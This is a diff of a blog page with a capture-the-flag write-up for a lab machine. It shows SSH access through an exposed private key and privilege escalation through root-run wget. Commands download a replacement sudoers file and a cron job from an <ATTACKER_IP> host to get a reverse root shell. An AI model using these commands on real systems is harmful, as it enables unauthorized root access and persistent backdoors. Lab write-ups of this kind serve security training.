@@ -110,9 +110,9 @@
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-O</span> &lt;TARGET_IP&gt;
 </code></pre></div></div>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
-80/tcp open  http    Apache httpd 2.4.18
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
+80/tcp open http Apache httpd 2.4.18
 </code></pre></div></div>
 
 <p>Two services: SSH on port 22 and a web server on port 80. Navigating to <code class="language-plaintext highlighter-rouge">http://&lt;TARGET_IP&gt;</code> shows the default Apache page. Nothing interesting at first glance, but the page source reveals this comment:</p>
@@ -164,8 +164,8 @@ http://&lt;TARGET_IP&gt;/sitemap/.ssh/id_rsa
 </code></pre></div></div>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User jessie may run the following commands on CorpOne:
-    (ALL : ALL) ALL
-    (root) NOPASSWD: /usr/bin/wget
+ (ALL : ALL) ALL
+ (root) NOPASSWD: /usr/bin/wget
 </code></pre></div></div>
 
 <p>The standard approach most use is reading a privileged file directly, assuming the path is /root/root.txt:</p>
@@ -308,7 +308,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 <p>Append this line to the file:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jessie  ALL=(root) NOPASSWD: /bin/bash
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jessie ALL=(root) NOPASSWD: /bin/bash
 </code></pre></div></div>
 
 <blockquote>
@@ -327,7 +327,7 @@ uid=0(root) gid=0(root) groups=0(root)
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/wget http://&lt;ATTACKER_IP&gt;:8000/sudoers <span class="nt">-O</span> /etc/sudoers
 </code></pre></div></div>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/sudoers   100%[============================&gt;]   821  --.-KB/s   in 0s
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/sudoers 100%[============================&gt;] 821 --.-KB/s in 0s
 </code></pre></div></div>
 
 <p><strong>Step 4 — Get a root shell</strong></p>
@@ -397,7 +397,7 @@ $
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>wget http://&lt;ATTACKER_IP&gt;:8000/pwned_cron <span class="nt">-O</span> /etc/cron.d/pwned
 </code></pre></div></div>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/cron.d/pwned   100%[============================&gt;]   143  --.-KB/s   in 0s
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/cron.d/pwned 100%[============================&gt;] 143 --.-KB/s in 0s
 </code></pre></div></div>
 
 <p>Wait up to 60 seconds. When cron fires the job, the listener catches the connection:</p>
@@ -414,20 +414,28 @@ uid=0(root) gid=0(root) groups=0(root)
 
 <div class="mermaid">
 graph TD
-    A["nmap scan"] --&gt; B["Port 80\nApache default page"]
-    B --&gt; C["HTML source comment\nusername: jessie"]
-    B --&gt; D["gobuster\nweb enumeration"]
-    D --&gt; E["Indexed .ssh directory\n/sitemap/.ssh/id rsa"]
-    C --&gt; F["SSH access\njessie - private key"]
-    E --&gt; F
-    F --&gt; G["sudo -l\nNOPASSWD: /usr/bin/wget"]
-    G --&gt; V1["Vector 1\n--post-file\narbitrary file read"]
-    G --&gt; V2["Vector 2\n/etc/passwd overwrite\nnew uid=0 user"]
-    G --&gt; V3["Vector 3\n/etc/sudoers overwrite\nNOPASSWD: /bin/bash"]
-    G --&gt; V4["Vector 4\ncron job injection\nreverse shell"]
-    V2 --&gt; R["root"]
-    V3 --&gt; R
-    V4 --&gt; R
+ subgraph RECON["RECON"]
+  A["nmap scan puerto 80"]
+ end
+ 
+ subgraph ENUM["ENUMERATION"]
+  B["HTML comment descubierto"] --&gt; C["username: jessie"]
+  D["gobuster enumeracion"] --&gt; E["Directorio .ssh indexado"]
+ end
+ 
+ subgraph EXPL["EXPLOITATION"]
+  F["SSH access con private key"]
+ end
+ 
+ subgraph PRIVESC["PRIVESC"]
+  G["sudo -l detecta wget NOPASSWD"] --&gt; H["wget como root exploited"]
+  H --&gt; I["root access obtenido"]
+ end
+ 
+ A --&gt; B
+ C --&gt; D
+ E --&gt; F
+ F --&gt; G
 </div>
 
 <hr />
@@ -438,6 +446,23 @@ graph TD
 
 <p>The exposed private key is a good reminder that web server configuration matters as much as application security. Directory listing enabled on a <code class="language-plaintext highlighter-rouge">.ssh</code> folder inside the web root is the kind of misconfiguration that ends a pentest before it really begins.</p>
 
+
+
+  <script src="https://giscus.app/client.js"
+        data-repo="renekerr/renekerr.github.io"
+        data-repo-id="R_kgDOS3a2UA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDOS3a2UM4DCBOG"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="en"
+        crossorigin="anonymous"
+        async>
+</script>
 
 </div>
 
@@ -453,27 +478,27 @@ graph TD
     
       <li>
         <h3>
-          <a href="/ctf/web/2026/07/10/blog/">
-            Blog
-            <small>10 Jul 2026</small>
+          <a href="/ctf/puzzle/steganography/web/privesc/2026/08/19/biohazard-ctf/">
+            Biohazard CTF: Unraveling a Resident Evil Puzzle Box
+            <small>19 Aug 2026</small>
           </a>
         </h3>
       </li>
     
       <li>
         <h3>
-          <a href="/ctf/2026/07/08/watcher/">
-            Watcher
-            <small>08 Jul 2026</small>
+          <a href="/ctf/web/privesc/joomla/2026/08/16/joker-ctf/">
+            Joker CTF
+            <small>16 Aug 2026</small>
           </a>
         </h3>
       </li>
     
       <li>
         <h3>
-          <a href="/websec/2026/07/07/username-enumeration-timing/">
-            Username Enumeration via Response Timing
-            <small>07 Jul 2026</small>
+          <a href="/ctf/web/privesc/2026/08/09/boilerctf/">
+            BoilerCTF
+            <small>09 Aug 2026</small>
           </a>
         </h3>
       </li>
